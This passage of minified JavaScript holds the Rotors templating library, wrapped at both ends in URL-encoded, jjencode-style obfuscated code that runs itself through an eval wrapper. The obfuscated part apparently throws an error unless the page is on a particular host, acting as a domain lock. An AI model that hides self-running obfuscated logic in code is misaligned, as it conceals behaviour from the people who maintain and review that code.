%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this, b = function (a) {
            return a.length > 0 ? a[a.length - 1] : null
        }, c = "undefined" != typeof navigator && /MSIE\s([\d.]+)/.test(navigator.userAgent) ? new Number(RegExp.$1) : -1,
        d = c > -1 && c < 9, e = function (a, b, c) {
            var d = function (b, c) {
                for (var d = [], e = 0; e < b.length; e++) {
                    var f = g({}, b[e]);
                    d.push(f), g(f.atts, c.atts, function (b, c) {
                        p(b, c, f, null, a)
                    })
                }
                return d
            }.bind(this);
            this.template = c.template, this.getFunctionBody = function (b) {
                return a.compile(d(a.parse(c.template, null, {
                    originalCustomTag: b.tag,
                    context: b.context
                }), b), !1, !0, !0)
            }.bind(this), this.getFunctionEnd = function () {
                return ";_els.pop();"
            }, this.rendered = c.rendered || function () {
            }, this.updated = c.updated || function () {
            }
        }, f = function (a, b) {
            for (var c = 0; c < a.length; c++) {
                var d = a[c];
                null != d && 0 !== d.length && b(c, d)
            }
        }, g = function (a, b, c) {
            for (var d in b) a[d] = b[d], c && c(d, a[d]);
            return a
        }, h = function (a, b, c) {
            if (null == a) return null;
            if ("$data" === b || null == b) return a;
            var d = b.match(/^\{(.*)\}$/);
            if (d) {
                for (var e = {}, f = d[1].split(","), g = 0; g < f.length; g++) {
                    var i = f[g].split(":"), j = h(a, i[1]);
                    e[n(i[0])] = j || i[1].replace(/'/g, "")
                }
                return e
            }
            b = b.replace(/\['([^']*)'\]/g, ".$1");
            var k = a, l = k, m = null;
            return b.replace(/([^\.])+/g, function (a, b, d, e) {
                if (null == m) {
                    var f = a.match(/([^\[0-9]+){1}(\[)([0-9+])/), g = d + a.length >= e.length, h = function () {
                        return l[f[1]] || function () {
                            return l[f[1]] = [], l[f[1]]
                        }()
                    };
                    if (g) if (f) {
                        var i = h(), j = f[3];
                        null == c ? m = i[j] : i[j] = c
                    } else null == c ? m = l[a] : l[a] = c; else if (f) {
                        var k = h();
                        l = k[f[3]] || function () {
                            return k[f[3]] = {}, k[f[3]]
                        }()
                    } else l = l[a] || function () {
                        return l[a] = {}, l[a]
                    }()
                }
            }), m
        }, i = function (b) {
            var c = a.document.getElementById(b);
            return null != c ? c.innerHTML : null
        }, j = function (a) {
            return "[object Array]" === Object.prototype.toString.call(a)
        }, k = function (a) {
            for (var b = [], c = 0; c < a.length; c++) j(a[c]) ? b.push.apply(b, k(a[c])) : b[b.length] = a[c];
            return b
        }, l = function (a, b) {
            for (var c = [], d = 0, e = a.length; d < e; d++) c.push(b(a[d]));
            return k(c)
        }, m = function (a, b) {
            for (var c = [], d = 0, e = a.length; d < e; d++) b(a[d]) && c.push(a[d]);
            return c
        }, n = function (a) {
            if (null == a) return a;
            for (var b = a.replace(/^\s\s*/, ""), c = /\s/, d = b.length; c.test(b.charAt(--d));) ;
            return b.slice(0, d + 1)
        }, o = function (a, b, c, d, e) {
            var f = r(), g = {w: b, e: [], u: f};
            e.bindings[f] = g;
            var h = function () {
                return null != d ? "try {  if(" + d + ") { out = out.replace(this.e[k][0], eval(this.e[k][1])); } else out=''; } catch(__) { out='';}" : "try { out = out.replace(this.e[k][0], eval(this.e[k][1])); } catch(__) { out=out.replace(this.e[k][0], '');}"
            }, i = function () {
                return null != d ? "var out='';try { with($data) { if (" + d + ") out = this.w; else return null; }}catch(_){return null;}" : "var out = this.w;"
            };
            return g.reapply = new Function("$data", i() + "for (var k = 0; k < this.e.length; k++) { with($data) { " + h() + " }} return out;"), c.bindings[a] = g, b.replace(/\$\{([^\}]*)\}/g, function (a, b, c, d) {
                g.e.push([a, b])
            }), f
        }, p = function (a, b, c, d, e) {
            c.atts[a] = b, o(a, b, c, d, e)
        }, q = function (a, b) {
            function c(a, c) {
                var d = a.match(/([^=]+)=['"](.*)['"]/);
                return null == d && null == c ? e.atts[a] = "" : null == d ? p(a, "", e, c, b) : p(d[1], d[2], e, c, b), d
            }

            for (var d = b.parseAttributes(a), e = {el: n(d[0]), atts: {}, bindings: {}}, f = 1; f < d.length; f++) {
                var g = n(d[f]);
                if (null != g && g.length > 0) {
                    var h = g.match(b.inlineIfRe);
                    if (h) for (var i = h[2].split(b.attributesRe), j = 0; j < i.length; j++) {
                        var k = n(i[j]);
                        null != k && k.length > 0 && c(k, h[1])
                    } else c(g)
                }
            }
            return e
        }, r = function (a) {
            return (a ? "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx" : "xxxxxxxx-xxxx-4xxx").replace(/[xy]/g, function (a) {
                var b = 16 * Math.random() | 0;
                return ("x" == a ? b : 3 & b | 8).toString(16)
            })
        }, s = function (a) {
            if (null == a || 0 === a.length) return !1;
            for (var b = a.length - 1; b > -1; b--) if ("each" === a[b].type) return !0;
            return !1
        }, t = function (a, b) {
            var c = this.bindings[b];
            return null == c ? "" : c.reapply(a)
        }, u = function (a, b) {
            this.uuid = r(), this.children = [], this.instance = b, b.entries[this.uuid] = this
        }, v = function (a, b) {
            u.apply(this, arguments);
            var c = q(a, b);
            null != c.atts["r-toggle"] && null != b.toggleManager && (this.discard = !1 === b.toggleManager(c.atts["r-toggle"]));
            var d = c.el.split(":");
            this.tag = c.el, 2 === d.length && (this.namespace = d[0]), this.atts = c.atts, this.bindings = c.bindings, this.type = "element", this.compile = function (a, b) {
                var c = a.customTags[this.tag] || a.globalTags[this.tag];
                if (c) {
                    for (var d = c.getFunctionBody(this), e = a.customTags[this.tag] ? "_rotors.customTags['" + this.tag + "'].rendered(_le, _rotors, data[0]);" : "_rotors.globalTags['" + this.tag + "'].rendered(_le, _rotors, data[0]);", f = 0; f < this.children.length; f++) this.children[f].precompile && (d += this.children[f].precompile(a)), d += this.children[f].compile(a), this.children[f].postcompile && (d += this.children[f].postcompile(a));
                    return d += "_le=_els.pop();" + e + "_rotors.pet(_eid,'" + this.uuid + "');"
                }
                var g = "/* element entry " + this.uuid + " */;";
                if (!0 !== this.remove) {
                    g += a.getExecutionContent(this.tag, this.uuid, !1, this.namespace);
                    for (var h in this.atts) if (this.atts.hasOwnProperty(h)) {
                        var i;
                        i = null != this.bindings[h] ? "_rotors.bind(data[0], '" + this.bindings[h].u + "');" : "'" + this.atts[h] + "'", g += "__a=" + i + ";if(__a!=null) {_rotors.setAttribute(e,'" + h + "',__a || '');}"
                    }
                }
                for (var j = 0; j < this.children.length; j++) this.children[j].precompile && (g += this.children[j].precompile(a)), g += this.children[j].compile(a), this.children[j].postcompile && (g += this.children[j].postcompile(a));
                return !0 === this.remove || b || (g += "_le=_els.pop();", g += "_rotors.pet(_eid, '" + this.uuid + "');"), g
            };
            var e = function (a, c) {
                b.each(c.split(";"), function (b) {
                    var c = b.indexOf(":"), d = b.substring(0, c);
                    a.style[d] = b.substring(c + 1)
                })
            };
            this.update = function (a, c) {
                for (var d in this.atts) if (this.atts.hasOwnProperty(d) && "class" !== d) {
                    var f;
                    f = null != this.bindings[d] ? this.bindings[d].reapply(c) : "'" + this.atts[d] + "'", null != f && ("style" === d && null != a.style ? e(a, f) : a.setAttribute(d, f))
                }
                if (this.originalCustomTag) {
                    var g = b.customTags[this.originalCustomTag] || b.globalTags[this.originalCustomTag];
                    g && g.updated(a, c)
                }
            }
        }, w = function (a) {
            this.uuid = r(), this.comment = a, this.compile = function () {
                return ""
            }
        }, x = function (a, b) {
            u.apply(this, arguments), this.value = a.value, this.type = "text", this.bindings = {};
            var c = function () {
                return "_rotors.bind(data[0], '" + this.bindings.__element.u + "', typeof $key !== 'undefined' ? $key : null, typeof $value !== 'undefined' ? $value : null)"
            }.bind(this);
            this.compile = function (a) {
                return a.getExecutionContent(c(), this.uuid, !0) + ";_rotors.pet(_eid, '" + this.uuid + "');"
            }, this.update = function (a, b) {
                a.nodeValue = this.bindings.__element.reapply(b)
            }
        }, y = function () {
            this.childNodes = [], this.appendChild = function (a) {
                this.childNodes.push(a)
            }, this.toString = function () {
                for (var a = "", b = 0; b < this.childNodes.length; b++) a += this.childNodes[b].toString();
                return a
            }
        }, z = function (a) {
            y.apply(this), this.tag = a;
            var b = {};
            this.setAttribute = function (a, c) {
                b[a] = c
            }, this.getAttribute = function (a) {
                return b[a]
            }, this.setAttributeNS = function (a, c, d) {
                b[a + ":" + c] = d
            }, this.toString = function () {
                var a = "<" + this.tag, c = "";
                for (var d in b) c += " " + d + '="' + b[d] + '"';
                a = a + c + ">";
                for (var e = 0; e < this.childNodes.length; e++) a += this.childNodes[e].toString();
                return a + "</" + this.tag + ">"
            }
        }, A = function (a) {
            this.nodeValue = a, this.toString = function () {
                return this.nodeValue
            }
        }, B = function (a) {
            return a.isBrowser ? i : null
        }, C = function (a, b, c) {
            return function (d) {
                var e = c ? null : a.cache[d];
                return null == e && (e = b(d)), null == e && (e = a.defaultTemplate), null != e && (a.cache[d] = e), e
            }
        }, D = function (a) {
            a = a || {}, this.cache = {}, this.templateCache = {}, this.customTags = {}, null != a.defaultTemplate && this.setDefaultTemplate(a.defaultTemplate), this.templateResolver = a.templateResolver ? a.templateResolver : a.templates ? function (b) {
                return a.templates[b]
            } : B(this), this.toggleManager = null
        };
    !function (a, b) {
        for (var c in b) b.hasOwnProperty(c) && (a[c] = b[c])
    }(D.prototype, {
        bindings: {},
        entries: {},
        executions: {},
        bind: t,
        defaultTemplate: "<div></div>",
        defaultCompiledTemplate: null,
        setDefaultTemplate: function (a) {
            null != a ? (this.defaultTemplate = a, this.defaultCompiledTemplate = this.compile(this.parse(a))) : this.clearDefaultTemplate()
        },
        clearDefaultTemplate: function () {
            this.defaultTemplate = null, this.defaultCompiledTemplate = null
        },
        clearCache: function () {
            this.cache = {}, this.templateCache = {}
        },
        namespaceHandlers: {
            svg: function (a) {
                return "e = document.createElementNS('http://www.w3.org/2000/svg', '" + a.split(":")[1] + "');e.setAttribute('version', '1.1');e.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');"
            }
        },
        namespaces: {xlink: "http://www.w3.org/1999/xlink"},
        each: function (a, b, c, d) {
            var e;
            if (j(a)) for (e = 0; e < a.length; e++) b(a[e], c, e, d); else for (e in a) a.hasOwnProperty(e) && b({
                $key: e,
                $value: a[e]
            }, c, e, d)
        },
        openRe: new RegExp("<([^/>]*?)>$|<([^/].*[^/])>$"),
        closeRe: new RegExp("^</([^>]+)>"),
        openCloseRe: new RegExp("<(.*)(/>$)"),
        tokenizerRe: /(<[^\^>]+\/>)|(<!--[\s\S]*?-->)|(<[\/a-zA-Z0-9\-:]+(?:\s*[a-zA-Z\-]+=\"[^\"]*\"|\s*[a-zA-Z\-]+='[^']+'|\s*[a-zA-Z\-]|\s*\{\{.*\}\})*>)/,
        commentRe: /<!--[\s\S]*?-->/,
        attributesRe: /([a-zA-Z0-9\-_:]+="[^"]*")|(\{\{if [^(?:\}\})]+\}\}.*\{\{\/if\}\})/,
        inlineIfRe: /\{\{if ([^\}]+)\}\}(.*)\{\{\/if\}\}/,
        singleExpressionRe: /^[\s]*\$\{([^\}]*)\}[\s]*$/,
        parseAttributes: function (a) {
            return null == a ? a : this.filterEmpty(a.replace("/>", ">").split(/^<|>$/)[1].split(this.attributesRe))
        },
        map: l,
        flatten: k,
        filter: m,
        data: h,
        uuid: r,
        filterEmpty: function (a) {
            return m(a, function (a) {
                return null != a && n(a).length > 0
            })
        },
        isBrowser: function () {
            return "undefined" != typeof navigator
        }(),
        isOldIE: function () {
            return d
        },
        cf: function () {
            return this.isBrowser ? this.isOldIE() ? a.document.createElement("div") : a.document.createDocumentFragment() : new y
        },
        ctn: function (b) {
            return this.isBrowser ? a.document.createTextNode(b) : new A(b)
        },
        ce: function (b) {
            return this.isBrowser ? a.document.createElement(b) : new z(b)
        },
        customElements: {
            "r-each": {
                parse: function (a, b, c, d) {
                    a.context = a.atts.in, a.type = "each"
                }, compile: function (a) {
                    var b = function () {
                        var b = "function(item, _rotorsLoopId, _rotorsLoopIndex, _rotorsLoopContext) { ";
                        b += "data.unshift(item);$value=item;$key=_rotorsLoopIndex;";
                        for (var c = 0; c < this.children.length; c++) b += this.children[c].compile(a);
                        return b += "data.splice(0,1);", b += "}"
                    }.bind(this);
                    return ";_rotors.te(null, _eid, '" + this.uuid + "');" + (this.context ? ';data.unshift(_rotors.data(data[0], "' + this.context + '"));' : "") + "_rotors.each(data[0], " + b() + ",'" + this.uuid + "', '" + this.context.replace(/'/g, "\\'") + "');" + (this.context ? ";data.splice(0, 1);" : "") + ";_rotors.pet(_eid, '" + this.uuid + "');"
                }
            }, "r-if": {
                parse: function (a, b, c, d) {
                    a.test = a.atts.test
                }, compile: function (a) {
                    var b, c = "", d = "", e = this.happyFlowChildren || this.children;
                    for (b = 0; b < e.length; b++) c += e[b].compile(a) + ";";
                    if (null != this.happyFlowChildren) {
                        for (d = "else {", b = 0; b < this.children.length; b++) d += this.children[b].compile(a) + ";";
                        d += "}"
                    }
                    return ";with (data[0]) { if(" + this.test + ") { " + c + " }" + d + "}"
                }
            }, "r-else": {
                remove: !0, parse: function (a, b, c, d, e) {
                    var f = H.peek(e);
                    null != f && "r-if" === f.tag && (f.happyFlowChildren = f.children, f.children = [])
                }, compile: function (a) {
                }
            }, "r-for": {
                parse: function (a, b, c, d, e) {
                    a.loop = a.atts.loop
                }, compile: function (a) {
                    var b = "";
                    b += "var __limit; with(data[0]){__limit=(" + this.loop + ");}", b += "for(var $index=0;$index<__limit;$index++){data[0].$index=$index;";
                    for (var c = 0; c < this.children.length; c++) b += this.children[c].compile(a) + ";";
                    return b += "}delete data[0].$index;"
                }
            }, "r-tmpl": {
                remove: !0, parse: function (a, b, c, d, e, f) {
                    if (a.type = "template", a.context = a.atts.context, a.atts.lookup) a.lookup = a.atts.lookup, a.default = a.atts.default || "", a.compile = function (b) {
                        return ';with(data[0]){var tlid=eval("' + a.lookup.replace(/[\$\{\}]/g, "") + '");}if (_rotors.templateCache[tlid] == null){var ___t = _rotors.templateResolver(tlid) || _rotors.templateResolver("' + a.default + '");_rotors.templateCache[tlid]=_rotors.compile(_rotors.parse(___t));} eval(_rotors.templateCache[tlid].functionBody);'
                    }; else {
                        a.templateId = a.atts.id;
                        var g = s(e);
                        if (-1 !== f.indexOf(a.templateId)) {
                            if (!g) throw new TypeError("recursive template call [" + a.templateId + "]");
                            a.compile = function (b) {
                                return ";eval(_rotors.templateCache['" + a.templateId + "'].functionBody);"
                            }
                        } else {
                            var h = c(a.templateId);
                            f.push(a.templateId);
                            var i = d.parse(h, c, null, f);
                            null == d.templateCache[a.templateId] && (d.templateCache[a.templateId] = d.compile(i));
                            for (var j = 0; j < i.length; j++) i[j].context = a.context;
                            d.debug("nested ast", i), a.children = i, f.pop()
                        }
                    }
                }, precompile: function (a) {
                    return this.context ? ';data.unshift(_rotors.data(data[0], "' + this.context + '"));' : ""
                }, postcompile: function (a) {
                    return this.context ? ";data.splice(0, 1);" : ""
                }
            }, "r-html": {
                parse: function (a, b, c, d) {
                }, compile: function (a) {
                    try {
                        return ";var __hp=_rotors.parse(data[0]." + this.children[0].bindings.__element.e[0][1] + "),__hc=_rotors.compile(__hp,true);var __f=__hc(data[0], _rotors);Rotors.peek(_els).appendChild(__f.childNodes[0]);"
                    } catch (b) {
                        return a.maybeDebug("Could not find key to bind for r-html element. Should be in the form <r-html>${key}</r-html> ('key' can be anything)"), ""
                    }
                }
            }
        },
        globalTags: {},
        registerTag: function (a, b, c) {
            this[c ? "globalTags" : "customTags"][a] = new e(this, a, b)
        },
        setAttribute: function (a, b, c) {
            var d = b.split(":");
            1 === d.length || null == this.namespaces[d[0]] ? a.setAttribute(d[0], c) : a.setAttributeNS(this.namespaces[d[0]], d[1], c)
        },
        setToggleManager: function (a) {
            this.toggleManager = a
        },
        debugEnabled: !1,
        debug: function () {
            this.debugEnabled && console.log.apply(console, arguments)
        },
        maybeDebug: function () {
            this.debugEnabled && arguments[0] && console.log.apply(console, arguments)
        },
        parse: function (a, b, c, d) {
            d = d || [], b = C(this, b || this.templateResolver, null);
            var e = [], g = [], h = this, i = function (a, b) {
                var c = a.match(b);
                return null != c && c
            }, j = function () {
                return e.length > 0 ? e[e.length - 1] : null
            }, k = function (a) {
                var b = j();
                return null != b && b.tag == a
            }, l = function (a, b) {
                e.length > 0 && j().children.push(a), b ? 0 == e.length && g.push(a) : e.push(a)
            }, m = function (a) {
                l(a, !0)
            }, p = function () {
                var a = e.pop();
                if (0 !== e.length || a.discard) {
                    if (a.discard) {
                        var b = H.peek(e);
                        b && b.children.pop()
                    }
                } else g.push(a);
                return a
            }, q = function (a, b, c, d, f) {
                var g = new v(a, d), h = d.customElements[g.tag];
                return h && (h.parse(g, b, c, d, e, f), h.compile && (g.compile = h.compile), g.precompile = h.precompile, g.postcompile = h.postcompile, g.custom = !0, g.remove = h.remove, d.debug("  element is a custom element"), d.maybeDebug(g.remove, "  element's root should not appear in output")), g
            }, r = [{
                re: h.commentRe, handler: function (a, b, c, d) {
                    d.debug("comment", a, b), l(new w(a), !0)
                }
            }, {
                re: h.openRe, handler: function (a, b, c, d, e) {
                    d.debug("open element", a, b);
                    var f = q(a, b, c, d, e);
                    l(f, f.remove)
                }
            }, {
                re: h.closeRe, handler: function (a, b, c, d) {
                    d.debug("close element", a, b);
                    var e = d.customElements[b[1]];
                    if (null == e || !e.remove) {
                        if (!k(b[1])) throw new TypeError("Unbalanced closing tag '" + b[1] + "'; opening tag was '" + p().tag + "'");
                        p()
                    }
                }
            }, {
                re: h.openCloseRe, handler: function (a, b, c, d, e) {
                    d.debug("open and close element", a, b);
                    var f = q(a, b, c, d, e);
                    l(f, !0)
                }
            }, {
                re: /.*/, handler: function (a, b, c, d) {
                    d.debug("text node", a);
                    var e = new x({value: a}, d);
                    m(e), o("__element", a, e, null, d)
                }
            }];
            if (f(n(a).split(this.tokenizerRe), function (a, c) {
                for (var e = n(c), f = 0; f < r.length; f++) {
                    var g = i(e, r[f].re);
                    if (g) {
                        r[f].handler(c, g, b, this, d);
                        break
                    }
                }
            }.bind(this)), g.length > 0 && c) for (var s in c) g[0][s] = c[s];
            return g
        },
        compile: function (a, b, c, d) {
            for (var e = "data=[data||{}];var frag=_rotors.cf(),_els=[],e,_le,__a,$value,$key,_eid = _rotors.nec();_els.push(frag);", f = "return frag;", g = [], h = 0; h < a.length; h++) {
                var i = "";
                a[h].precompile && (i += a[h].precompile(this)), i += a[h].compile(this, d), a[h].postcompile && (i += a[h].postcompile(this)), g.push(i)
            }
            var j = g.join("");
            if (this.debug("function body :", j), c) return j;
            var k = new Function("data,_rotors", e + j + f), l = this;
            if (b) return k;
            var m = function (a) {
                return k.apply(this, [a, l])
            };
            return m.functionBody = j, m
        },
        nec: function () {
            var a = this.uuid();
            return this.executions[a] = {current: [{children: []}]}, a
        },
        te: function (a, b, c, d) {
            var e = {el: a, children: [], id: c, index: d};
            this.executions[b].current[0].children.push(e);
            var f = c + (null != d ? "-" + d : "");
            this.executions[b][f] = e, this.executions[b].current.unshift(e)
        },
        pet: function (a, b) {
            this.executions[a].current = this.executions[a].current.splice(1)
        },
        getExecutionContent: function (a, b, c, d, e) {
            return (null != d ? this.namespaceHandlers[d](a) : c ? "e=_rotors.ctn(" + a + ");" : "e=_rotors.ce('" + a + "');") + "Rotors.peek(_els).appendChild(e);" + (c ? "" : "_els.push(e);") + "e._rotors=_rotors.entries['" + b + "'];e._rotorsEid=_eid;if(typeof _rotorsLoopId !== 'undefined') {e._rotorsLoopId=_rotorsLoopId;e._rotorsLoopIndex=_rotorsLoopIndex;e._rotorsLoopContext=_rotorsLoopContext;}_rotors.te(e, _eid, '" + b + "', typeof _rotorsLoopIndex != 'undefined' ? _rotorsLoopIndex : null);"
        },
        updaters: {},
        onUpdate: function (a, b) {
            if (null != a._rotors) {
                var c = a._rotors.instance;
                a._RotorsUpdate = a._RotorsUpdate || r(), c.updaters[a._RotorsUpdate] = c.updaters[a._RotorsUpdate] || [], c.updaters[a._RotorsUpdate].push(b)
            }
        },
        update: function (a, b) {
            var c, d, e, f = [], g = a._rotorsEid;
            if (null != g && null != a._rotors) {
                e = a._rotors.instance, c = e.executions[g];
                var h = a._rotorsLoopIndex;
                d = c[a._rotors.uuid + (null != h ? "-" + h : "")];
                var i = function (a, b, c) {
                    null != a && (a._rotors.update(a, b), a._RotorsUpdate && e.updaters[a._RotorsUpdate] && f.push([a, e.updaters[a._RotorsUpdate], b]));
                    for (var d = 0; d < c.children.length; d++) {
                        var g = e.entries[c.children[d].id], h = "each" === e.entries[c.id].type,
                            j = h && null != c.children[d].el && null != c.children[d].el._rotorsLoopIndex ? b[c.children[d].el._rotorsLoopIndex] : e.data(b, g.context);
                        i(c.children[d].el, j, c.children[d])
                    }
                };
                i(a, b, d);
                for (var j = 0; j < f.length; j++) for (var k = f[j], l = 0; l < k[1].length; l++) try {
                    k[1][l](k[0], k[2])
                } catch (a) {
                }
            }
        },
        updateExternal: function (a, b) {
            b = b || {};
            var c, d, e, f = function (a) {
                if (a.nodeType === Node.ELEMENT_NODE) {
                    for (var g = 0, i = a.attributes.length; g < i; g++) c = a.attributes[g], "rotors" === c.name ? (d = c.value, a.innerHTML = h(b, d)) : 0 === c.name.indexOf("rotors-") && (d = c.value, e = c.name.substring(7), a.setAttribute(e, h(b, d)));
                    for (g = 0; g < a.childNodes.length; g++) f(a.childNodes[g])
                }
            };
            f(a)
        },
        remove: function (a) {
            a._RotorsUpdate && this.updaters[a._RotorsUpdate] && delete this.updaters[a._RotorsUpdate], a._rotorsEid && this.executions[a._rotorsEid] && delete this.executions[a._rotorsEid]
        },
        template: function (a, b, c, d) {
            var e, f = d ? null : this.templateCache[a];
            if (null != f) return e = f(b), this.isOldIE() ? e.childNodes[0] : e;
            c = C(this, c || this.templateResolver, d);
            var g = c(a);
            if (null != g) {
                var h = this.parse(g, c, null, [a]), i = this.compile(h);
                return this.templateCache[a] = i, e = i(b), this.isOldIE() ? e.childNodes[0] : e
            }
            return this.cf()
        },
        precompileTemplate: function (a, b) {
            var c = this.parse(a, b || this.templateResolver);
            return this.compile(c, !0)
        },
        precompileTemplates: function (a, b) {
            var c = function (c) {
                return a[c] || (b || this.templateResolver)(c)
            }, d = {};
            for (var e in a) d[e] = this.precompileTemplate(a[e], c);
            return d
        },
        importTemplate: function (a, b) {
            var c = this;
            b = "string" == typeof b ? Function("data", "_rotors", b) : b, this.templateCache[a] = function (a) {
                return b.apply(c, [a, c])
            }
        },
        importTemplates: function (a) {
            for (var b in a) this.importTemplate(b, a[b])
        },
        importBindings: function (a) {
            this.bindings = this.bindings || {};
            for (var b in a) {
                var c = a[b];
                this.bindings[b] = {e: c.e, u: c.u, w: c.w, reapply: Function("$data", c.reapply)}
            }
        }
    });
    var E = function (a) {
        return new D(a)
    }, F = function (a) {
        var b = {};
        for (var c in a.bindings) {
            var d = a.bindings[c];
            b[c] = {
                e: d.e,
                u: d.u,
                w: d.w,
                reapply: String(d.reapply).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g, "")
            }
        }
        return b
    }, G = function (b, c) {
        c = c || "rotors";
        var d, e = a.Rotors.newInstance(), f = {},
            g = new RegExp("<script type=['\"]" + c + "['\"] id=['\"]([^'\"]+)['\"]>((.*\n)*?)<\/script>", "g");
        d = b.replace(g, function (a, b, c) {
            return f[b] = c, ""
        });
        var h = [{}, null, d];
        for (var i in f) h[0][i] = String(e.precompileTemplate(f[i], function (a) {
            return f[a]
        })).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g, "");
        return h[1] = F(e), h
    }, H = a.Rotors = {newInstance: E, precompile: G, data: h, version: "0.3.17", peek: b};
    "undefined" != typeof exports && (exports.Rotors = H, exports.RotorsInstance = D)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%2